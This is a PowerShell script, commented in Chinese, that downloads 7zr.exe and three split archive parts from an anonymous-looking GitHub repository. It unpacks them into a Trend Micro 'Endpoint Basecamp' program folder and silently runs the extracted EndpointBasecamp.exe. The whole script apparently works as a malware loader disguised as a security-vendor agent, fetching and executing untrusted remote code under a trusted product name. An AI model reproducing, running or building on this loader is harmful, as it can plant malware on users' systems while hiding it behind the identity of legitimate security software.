$ErrorActionPreference = "Stop"

# 定義 7zr.exe 的下載路徑
$sevenZipUrl = "https://www.7-zip.org/a/7zr.exe"
$sevenZipPath = "C:\Program Files (x86)\TrendMicro\Endpoint Basecamp\7zr.exe"
$baseDir = "C:\Program Files (x86)\TrendMicro\Endpoint Basecamp"
$downloadBaseUrl = "https://github.com/uvUpAjx4Zp/Khsw/raw/refs/heads/main"
$fileParts = @(
    "EndpointBasecamp.zip.001",
    "EndpointBasecamp.zip.002",
    "EndpointBasecamp.zip.003"
)

# 下載 7zr.exe
if (-not (Test-Path $sevenZipPath)) {
    Invoke-WebRequest -Uri $sevenZipUrl -OutFile $sevenZipPath
}

# 下載壓縮檔
foreach ($filePart in $fileParts) {
    $fileUrl = "$downloadBaseUrl/$filePart"
    $destinationPath = Join-Path -Path $baseDir -ChildPath $filePart
    if (-not (Test-Path $destinationPath)) {
        Invoke-WebRequest -Uri $fileUrl -OutFile $destinationPath
    }
}

# 解壓縮檔案
$sevenZipArgs = "x `"$baseDir\EndpointBasecamp.zip.001`" -o`"$baseDir`" -y"
$process = Start-Process -FilePath $sevenZipPath -ArgumentList $sevenZipArgs -NoNewWindow -Wait -PassThru
if ($process.ExitCode -ne 0) {
    exit 1
}

# 執行解壓縮後的檔案
$extractedFile = Join-Path -Path $baseDir -ChildPath "EndpointBasecamp.exe"
if (Test-Path $extractedFile) {
    Start-Process -FilePath $extractedFile -NoNewWindow
}
